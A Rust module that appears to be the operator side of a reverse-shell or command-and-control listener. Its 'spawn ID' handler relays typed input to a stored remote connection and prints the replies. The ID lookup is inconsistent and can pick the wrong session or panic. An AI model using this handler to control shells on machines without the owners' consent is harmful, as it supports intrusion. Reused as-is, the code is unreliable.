use tokio::{
    select,
    io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt},
    // net::tcp::{OwnedReadHalf, OwnedWriteHalf},
    sync::
        Mutex,
};
use std::{
    io::{Error, ErrorKind, Write},
    collections::HashMap,
    sync::Arc,
};
use crate::utils::ConnectionInfo;

pub async fn handle_spawn(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool)
    -> Result<String, Error> {
    let parts: Vec<&str> = command.splitn(2, ' ').collect();
    if parts.len() < 2 {
        return Err(Error::new(ErrorKind::InvalidInput, "Invalid command, expected 'spawn ID'"));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err(Error::new(ErrorKind::InvalidInput, "Invalid ID")),
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err(Error::new(ErrorKind::InvalidInput, "Invalid ID"));
    }

    let (_, connection_info) = active_connections.iter().nth(id).unwrap();

    let stream = connection_info.stream.clone();
    let mut stream_lock = stream.lock().await;
    let (mut reader, mut writer) = stream_lock.split();
    if raw_connection {
        let mut input = String::new();
        let mut output = [0; 1024];
        let mut myreader = tokio::io::BufReader::new(tokio::io::stdin());
        println!("Spawned new shell on remote ID: {}. Type 'exit' to return.", id);
        loop {
            print!("$: ");
            std::io::stdout().flush().unwrap();
            select! {
                Ok(_) = myreader.read_line(&mut input) => {
                    if input.contains("exit") {
                        break;
                    }
                    writer.write_all(input.as_bytes()).await?;
                    input.clear();
                }
                Ok(_) = reader.read(&mut output) => {
                    println!("\r{}", String::from_utf8_lossy(&output).to_string());
                    output = [0; 1024];
                }
            }
        }
    } else {
        println!("TODO!");
    }
    Ok(format!("Exited interactive shell on {}", id))
}